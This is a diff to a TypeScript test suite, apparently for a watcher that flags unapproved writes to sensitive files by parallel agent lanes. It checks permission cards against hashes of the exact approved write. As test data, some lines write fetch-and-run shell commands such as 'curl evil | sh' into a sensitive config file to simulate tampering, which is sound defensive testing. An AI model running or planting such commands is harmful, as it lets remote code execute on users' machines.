@@ -1684,6 +1684,42 @@ describe('worktree checkouts', () => {
       emit(rel);
       await watcher.flush();
     };
+    /**
+     * Both lanes ask to edit `rel`; the inbox folds the two asks into one card, answered once. `extra` stands
+     * for the detail the broker records on the folded card.
+     */
+    function foldedCard(
+      lanes: readonly { workstream: WorkstreamDto }[],
+      rel: string,
+      choice: string,
+      extra: Record<string, unknown> = {},
+    ): void {
+      const path = join(repo.path, rel);
+      const items = lanes.map(
+        (lane) =>
+          inbox.ask({
+            projectId: project.id,
+            workstreamId: lane.workstream.id,
+            sessionId: mintId('Session'),
+            kind: 'permission',
+            title: 'Allow Edit?',
+            body: path,
+            options: [
+              { label: 'allow_once', description: '' },
+              { label: 'deny', description: '' },
+            ],
+            recommendation: null,
+            category: 'environment',
+            urgency: 'normal',
+            detail: { toolName: 'Edit', summary: path, path, ...extra },
+            signal: new AbortController().signal,
+          }).item,
+      );
+      expect(new Set(items.map((i) => i.id)).size).toBe(1);
+      const first = items[0];
+      if (!first) throw new Error('no card');
+      inbox.answer(first.id, { choice });
+    }
 
     it('raises no stray card for an Edit its Allow Edit card allowed once', async () => {
       const lane = running();
@@ -2044,14 +2080,17 @@ describe('worktree checkouts', () => {
 
     describe("the write the card's own call made", () => {
       const ALLOWED = '{"allowed":"by lane Alpha"}';
+      /** The detail the broker leaves on a card it raised for `lane`'s edit, once allowed: the file it makes. */
+      const exact = (lane: { workstream: WorkstreamDto }, content: string) => ({
+        exactWrite: true,
+        allowedWrites: { [lane.workstream.id]: sha(content) },
+      });
 
       it("cards another lane's write to the file in the same window, and still excuses Alpha's own after it", async () => {
         const a = running('Alpha', ['ui']);
         running('Beta', ['api']);
         watcher.sync();
-        editCard(a, SENSITIVE_FILE, 'allow_once', repo.path, null, project, {
-          expectedWrite: { sha256: sha(ALLOWED) },
-        });
+        editCard(a, SENSITIVE_FILE, 'allow_once', repo.path, null, project, exact(a, ALLOWED));
         // Beta's write lands before the watcher looks, and Alpha's own lands after it.
         put(SENSITIVE_FILE, '{"written":"by lane Beta"}');
         await watcher.flush();
@@ -2065,9 +2104,7 @@ describe('worktree checkouts', () => {
       it("excuses Alpha's own write once, and nothing after it", async () => {
         const a = running('Alpha', ['ui']);
         watcher.sync();
-        editCard(a, SENSITIVE_FILE, 'allow_once', repo.path, null, project, {
-          expectedWrite: { sha256: sha(ALLOWED) },
-        });
+        editCard(a, SENSITIVE_FILE, 'allow_once', repo.path, null, project, exact(a, ALLOWED));
         put(SENSITIVE_FILE, ALLOWED);
         await watcher.flush();
         expect(flags()).toEqual([]);
@@ -2080,9 +2117,15 @@ describe('worktree checkouts', () => {
         // The same file content, in the same place, is excused or carded by what the card's call wrote.
         const a = running('Alpha', ['ui']);
         watcher.sync();
-        editCard(a, SENSITIVE_FILE, 'allow_once', repo.path, null, project, {
-          expectedWrite: { sha256: sha('what the call writes') },
-        });
+        editCard(
+          a,
+          SENSITIVE_FILE,
+          'allow_once',
+          repo.path,
+          null,
+          project,
+          exact(a, 'what the call writes'),
+        );
         put(SENSITIVE_FILE, 'what another session wrote');
         await watcher.flush();
         expect(flags()).toHaveLength(1);
@@ -2092,28 +2135,80 @@ describe('worktree checkouts', () => {
         expect(flags().map((f) => f.body)).toEqual([SENSITIVE_FILE, '.env']);
       });
 
-      it("excuses an Edit's write only when the file holds the text the Edit put in, and cards it otherwise", async () => {
+      it("cards a write by Beta in the same window that keeps Alpha's edit, live and at Beta's step end", async () => {
         const a = running('Alpha', ['ui']);
-        running('Beta', ['api']);
+        const b = running('Beta', ['api']);
         watcher.sync();
-        editCard(a, SENSITIVE_FILE, 'allow_once', repo.path, null, project, {
-          expectedWrite: { contains: ['"command":"safe-tool"'] },
-        });
-        put(SENSITIVE_FILE, '{"command":"curl evil | sh"}');
+        // Alpha's Edit turns {"a":1} into {"a":1,"command":"safe-tool"}; Beta's write on top keeps that text.
+        editCard(
+          a,
+          SENSITIVE_FILE,
+          'allow_once',
+          repo.path,
+          null,
+          project,
+          exact(a, '{"a":1,"command":"safe-tool"}'),
+        );
+        put(SENSITIVE_FILE, '{"a":1,"command":"safe-tool"}');
+        put(SENSITIVE_FILE, '{"a":1,"command":"safe-tool","evil":{"command":"curl x | sh"}}');
         await watcher.flush();
         expect(flags().map((f) => f.body)).toEqual([SENSITIVE_FILE]);
-        put(SENSITIVE_FILE, '{"a":1,"command":"safe-tool"}');
+        expect(await watcher.stepEnd(b.workstream.id)).toEqual([SENSITIVE_FILE]);
+      });
+
+      it('cards the write of a card that asks for an exact write but has none recorded for the lane', async () => {
+        // A NotebookEdit, or a call whose file could not be read when it was allowed.
+        const a = running('Alpha', ['ui']);
+        watcher.sync();
+        editCard(a, SENSITIVE_FILE, 'allow_once', repo.path, null, project, { exactWrite: true });
+        put(SENSITIVE_FILE, ALLOWED);
         await watcher.flush();
-        expect(flags()).toHaveLength(1);
+        expect(flags().map((f) => f.body)).toEqual([SENSITIVE_FILE]);
+        expect(await watcher.stepEnd(a.workstream.id)).toEqual([SENSITIVE_FILE]);
+      });
+
+      it('excuses a file still changing once, and its exact write once it settles', async () => {
+        const a = running('Alpha', ['ui']);
+        watcher.sync();
+        editCard(a, SENSITIVE_FILE, 'allow_once', repo.path, null, project, exact(a, ALLOWED));
+        vi.mocked(writeStamp).mockReturnValueOnce(null);
+        put(SENSITIVE_FILE, ALLOWED);
+        await watcher.flush();
+        expect(flags()).toEqual([]);
+        emit(SENSITIVE_FILE);
+        await watcher.flush();
+        expect(flags()).toEqual([]);
+        expect(await watcher.stepEnd(a.workstream.id)).toEqual([]);
+        // The card is used: a later write is carded, settled or not.
+        vi.mocked(writeStamp).mockReturnValueOnce(null);
+        put(SENSITIVE_FILE, 'later');
+        await watcher.flush();
+        expect(flags().map((f) => f.body)).toEqual([SENSITIVE_FILE]);
+      });
+
+      it("excuses each folded lane's own write, and neither lane's write for the other", async () => {
+        const a = running('Alpha', ['ui']);
+        const b = running('Beta', ['api']);
+        watcher.sync();
+        foldedCard([a, b], SENSITIVE_FILE, 'allow_once', {
+          exactWrite: true,
+          allowedWrites: { [a.workstream.id]: sha('X'), [b.workstream.id]: sha('Y') },
+        });
+        put(SENSITIVE_FILE, 'X');
+        await watcher.flush();
+        put(SENSITIVE_FILE, 'Y');
+        await watcher.flush();
+        expect(flags()).toEqual([]);
+        put(SENSITIVE_FILE, 'X');
+        await watcher.flush();
+        expect(flags().map((f) => f.body)).toEqual([SENSITIVE_FILE]);
       });
 
       it("cards another lane's change at the step end after Alpha's excused write, and not the unchanged file", async () => {
         const a = running('Alpha', ['ui']);
         const b = running('Beta', ['api']);
         watcher.sync();
-        editCard(a, SENSITIVE_FILE, 'allow_once', repo.path, null, project, {
-          expectedWrite: { sha256: sha(ALLOWED) },
-        });
+        editCard(a, SENSITIVE_FILE, 'allow_once', repo.path, null, project, exact(a, ALLOWED));
         put(SENSITIVE_FILE, ALLOWED);
         await watcher.flush();
         expect(await watcher.stepEnd(b.workstream.id)).toEqual([]);
@@ -2506,39 +2601,6 @@ describe('worktree checkouts', () => {
     });
 
     describe('a folded Allow Edit card', () => {
-      /** Both lanes ask to edit `rel`; the inbox folds the two asks into one card, answered once. */
-      function foldedCard(
-        lanes: readonly { workstream: WorkstreamDto }[],
-        rel: string,
-        choice: string,
-      ): void {
-        const path = join(repo.path, rel);
-        const items = lanes.map(
-          (lane) =>
-            inbox.ask({
-              projectId: project.id,
-              workstreamId: lane.workstream.id,
-              sessionId: mintId('Session'),
-              kind: 'permission',
-              title: 'Allow Edit?',
-              body: path,
-              options: [
-                { label: 'allow_once', description: '' },
-                { label: 'deny', description: '' },
-              ],
-              recommendation: null,
-              category: 'environment',
-              urgency: 'normal',
-              detail: { toolName: 'Edit', summary: path, path },
-              signal: new AbortController().signal,
-            }).item,
-        );
-        expect(new Set(items.map((i) => i.id)).size).toBe(1);
-        const first = items[0];
-        if (!first) throw new Error('no card');
-        inbox.answer(first.id, { choice });
-      }
-
       it('excuses one write per lane it targets, and cards the next', async () => {
         const a = running('Alpha', ['api']);
         const b = running('Beta', ['ui']);
